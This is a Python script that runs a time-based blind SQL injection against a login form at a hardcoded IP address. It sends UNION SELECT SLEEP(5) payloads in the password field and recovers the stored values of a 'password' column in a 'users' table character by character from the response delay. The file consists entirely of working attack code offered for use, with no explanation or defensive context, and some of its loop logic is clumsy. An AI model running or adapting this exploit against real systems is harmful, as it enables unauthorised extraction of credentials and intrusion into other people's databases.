import requests
import time

def column_name(database, table, colonne):
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    columns_name=[]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 31:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            """while id != null:
                passwd = "' UNION SELECT SLEEP(5),1,2 username WHERE id = '1' and username like 'a%' -- "
                passwd2 = "' UNION SELECT SLEEP(5),1,2 password WHERE id = '1' and password like 'a%' -- " 
                id += 1 """
            passwd = "' UNION SELECT SLEEP(5),1,2 " + colonne + " FROM " + table + " WHERE " + colonne + " like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(texte)
            print(columns_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(columns_name)


z = "nom_user_db"
zz = "users"
zzz = "password"
column_name(z, zz, zzz)